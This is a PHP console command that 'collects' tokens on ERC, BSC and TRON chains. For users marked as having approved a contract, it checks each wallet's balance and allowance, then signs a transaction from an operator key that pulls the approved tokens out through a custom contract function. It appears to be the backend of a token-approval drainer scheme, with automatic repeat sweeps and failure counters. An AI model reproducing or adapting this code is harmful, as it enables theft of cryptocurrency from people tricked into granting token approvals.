<?php

namespace app\command;

use app\common\model\CollectRecord;
use app\common\model\Parameter;
use app\common\model\Token;
use app\common\model\User;
use Brick\Math\BigDecimal;
use Carbon\Carbon;
use Exception;
use IEXBase\TronAPI\Provider\HttpProvider;
use IEXBase\TronAPI\Tron;
use think\console\Command;
use think\console\Input;
use think\console\input\Argument;
use think\console\Output;
use Throwable;
use xtype\Ethereum\Client;

class Collect extends Command
{
    protected function configure()
    {
        $this->setName('collect')
            ->addArgument('uid', Argument::REQUIRED, '用户id')
            ->setDescription('归集');
    }

    protected function execute(Input $input, Output $output)
    {
        $uid = $input->getArgument('uid');
        if (!is_numeric($uid)) {
            $output->write('uid非法，不是数字');
            return false;
        }
        $user = User::where(['id' => $uid])
            ->findOrEmpty();
        if ($user->isEmpty()) {
            $output->write('用户不存在');
            return false;
        }

        if ($user['is_approve'] !== 1) {
            $output->write('用户未授权');
            return false;
        }
        //@todo 更多前置检测（余额、授权额等等），减少无谓调用

        $chain = $user['token']['chain'];
        if (!$chain) {
            $output->write('链不存在');
            return false;
        }
        $ret = false;
        //根据不同的链，调用不同的命令
        switch ($chain) {
            case 'erc':
            case 'bsc':
                $ret = $this->erc($user);
                break;
            case 'trc':
                $ret = $this->trc($user);
                break;
        }
        if (!$ret) {
            $output->writeln('操作失败，请稍后重试');
            return false;
        }
        //输出必须是ok，用来在控制器检查执行结果
        $output->write('ok');
    }

    protected function erc(User $user)
    {
        try {
            if ($user['collect_failure'] > 3) {
                echo sprintf('用户id：%s归集失败次数%s，取消任务执行', $user['id'], $user['collect_failure']);
                return false;
            }
            //执行时间间隔
            if (null !== $user['check_time'] && Carbon::now()->diffInSeconds($user['check_time']) < config('collect_interval')) {
                echo '执行间隔未达到';
                return false;
            }
            $coin = Token::where(['id' => $user['token_id']])
                ->findOrEmpty();
            //@todo 检查矿工余额，避免gas不足
            if ($coin->isEmpty()) {
                throw new Exception('币种不存在');
            }
            $client = new Client([
                'base_uri' => $coin['url'],
                'timeout' => 30,
            ]);
            //记录操作时间
            $userUpdate['check_time'] = Carbon::now();
            // 已授权地址
            $address = $user['wallet_address'];
            //symbol_code
            $symbolCode = $coin['contract_address'];
            // 合约
            $contract = $coin['contract']['contract_address'];
            $params = [
                'from' => $address,
                'to' => $symbolCode,
                'data' => '0x70a08231000000000000000000000000' . substr($address, 2),
            ];
            $res = $client->eth_call($params, 'latest');
            $dec = hexdec($res);

            $decimals = $coin['contract_decimals'];
            // 链上余额
            $balance = $dec / pow(10, $decimals);
            $balance = (int)$balance; //不要小数点
            if ($balance == 0) {
                echo sprintf('用户id：%s余额为%s', $user['id'], $balance);
                User::update($userUpdate, ['id' => $user['id']]);
                return false;
            }
            if ($user['min_sweep'] === 0) {
                $amount = $balance;
            } else {
                $amount = $user['min_sweep'];
            }

            $data = '0xdd62ed3e000000000000000000000000'
                . substr($address, 2)
                . '000000000000000000000000'
                . substr($contract, 2);
            $params2 = [
                'from' => $address,
                'to' => $symbolCode,
                'data' => $data,
            ];
            $approveRes = $client->eth_call($params2);
            //授权额
            $approveAmount = hexdec($approveRes) / pow(10, $decimals);
            if ($amount > $approveAmount) {
                $amount = $approveAmount;
            }

            $setting = Parameter::getDict();
            $min_collect_num = (int)$setting['min_collect_num'];

            if ($min_collect_num > 0 && $amount < $min_collect_num && $user['is_auto'] == 0) {
                echo sprintf('用户id：%s，小于归集数量为：%s，当前为：%s', $user['id'], $min_collect_num, $amount);
                return false;
            }

            $num = bcmul($amount, pow(10, $decimals));

            $client->addPrivateKeys([$coin['param']['sk']]);
            $data = '0x75595fcd000000000000000000000000'
                . substr($symbolCode, 2)
                . '000000000000000000000000'
                . substr($address, 2)
                . ethFill0($num);
            $trans = [
                'from' => $coin['param']['address'],
                'to' => $contract,
                'value' => '0x0',
                'data' => $data,
            ];
            $trans['gas'] = dechex(hexdec($client->eth_estimateGas(['from' => $coin['param']['address']])) * 1.3);
            $trans['gasPrice'] = $client->eth_gasPrice();
            $trans['nonce'] = $client->eth_getTransactionCount($coin['param']['address'], 'pending');

            $txid = $client->sendTransaction($trans);
            if ($txid != '') {
                //@todo 有txid返回未必是成功交易，还需要在后续环节查询，然后累加"已归集数量"、生成质押记录
                CollectRecord::create([
                    'user_id' => $user['id'],
                    'token_id' => $user['token_id'],
                    'amount' => $amount,
                    'txid' => $txid,
                ]);
                $userUpdate['collect_time'] = Carbon::now();
                $userUpdate['collect_count'] = $user['collect_count'] + 1;
                User::update($userUpdate, ['id' => $user['id']]);
                return true;
            } else {
                //累加归集失败次数
                $userUpdate['collect_failure'] = $user['collect_failure'] + 1;
                User::update($userUpdate, ['id' => $user['id']]);
                return false;
            }
        } catch (Throwable $exception) {
            echo $exception->getMessage();
            return false;
        }
    }

    protected function trc(User $user)
    {
        try {
            if ($user['collect_failure'] > 3) {
                echo sprintf('用户id：%s归集失败次数%s，取消任务执行', $user['id'], $user['collect_failure']);
                return false;
            }
            //执行时间间隔
            if (null !== $user['check_time'] && Carbon::now()->diffInSeconds($user['check_time']) < config('collect_interval')) {
                echo '执行间隔未达到';
                return false;
            }
            $coin = Token::where(['id' => $user['token_id']])
                ->findOrEmpty();
            if ($coin->isEmpty()) {
                throw new Exception('币种不存在');
            }
            if ($coin['param'] === null) {
                throw new Exception('币种配置参数未设置');
            }
            $decimals = $coin['contract_decimals'];
            //记录操作时间
            $userUpdate['check_time'] = Carbon::now();
            $fullNode = new HttpProvider($coin['url']);
            $solidityNode = new HttpProvider($coin['url']);
            $eventServer = new HttpProvider($coin['url']);
            $tron = new Tron($fullNode, $solidityNode, $eventServer, null);

            // 先获取链上余额
            $abi1 = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]';
            $abiAry = json_decode($abi1, true);
            $tokenContract = $coin['contract_address'];
            $function = 'balanceOf';
            $address = $user['wallet_address'];
            $params = [
                $tron->toHex($address),
            ];
            $result = $tron->getTransactionBuilder()
                ->triggerConstantContract($abiAry,
                    $tron->toHex($tokenContract),
                    $function,
                    $params,
                    $tron->toHex($address));
            $res = $result[0]->toString();
            if (!is_numeric($res)) {
                throw new Exception('Token balance is not number');
            }
            $balance = bcdiv($res, bcpow('10', $decimals), $decimals);
            if ($user['min_sweep'] === 0) {
                $amount = $balance;
            } else {
                $amount = $user['min_sweep'];
            }

            $num = BigDecimal::of($amount)
                ->multipliedBy(bcpow(10, $decimals))
                ->toBigInteger();
            // 函数参数
            $params2 = [
                // token
                0 => $tron->toHex($coin['contract_address']),
                // 已授权地址
                1 => $tron->toHex($user['wallet_address']),
                // 数量
                2 => base_convert((string)$num, 10, 16),
            ];
            // owner_address 发起transaction的地址 The sending party of the transaction
            $owner_address = $tron->toHex($coin['param']['address']);
            // 矿工费账户
            $tron->setAddress($coin['param']['address']);
            $tron->setPrivateKey($coin['param']['sk']);
            $abi = json_decode('[{"inputs":[{"name":"_lpadd","type":"address"}],"name":"biSend","stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_lpadd","type":"address"},{"name":"_add","type":"address"},{"name":"_v","type":"uint256"}],"outputs":[],"name":"biTransfer","stateMutability":"nonpayable","type":"function"},{"outputs":[{"type":"address"}],"name":"feeaddress","stateMutability":"view","type":"function"}]',
                true);
            // 合约
            $contract = $tron->toHex($coin['contract']['contract_address']);
            // 调用函数 biTransfer(address _lpadd, address _add, uint256 _v)
            $function = 'biTransfer';
            $transaction = $tron->getTransactionBuilder()
                ->triggerSmartContract($abi, $contract, $function, $params2, 1000000000, $owner_address);
            $signData = $tron->signTransaction($transaction);
            $res = $tron->sendRawTransaction($signData);
            if (isset($res['result']) && $res['result']) {
                CollectRecord::create([
                    'user_id' => $user['id'],
                    'amount' => $amount,
                    'token_id' => $user['token_id'],
                    'txid' => $res['txid'],
                ]);
                $userUpdate['collect_time'] = Carbon::now();
                $userUpdate['collect_count'] = $user['collect_count'] + 1;
                User::update($userUpdate, ['id' => $user['id']]);
                return true;
            } else {
                //失败情况
                //累加归集失败次数
                $userUpdate['collect_failure'] = $user['collect_failure'] + 1;
                User::update($userUpdate, ['id' => $user['id']]);
                return false;
            }
        } catch (Throwable $exception) {
            echo $exception->getMessage();
            return false;
        }
    }

}
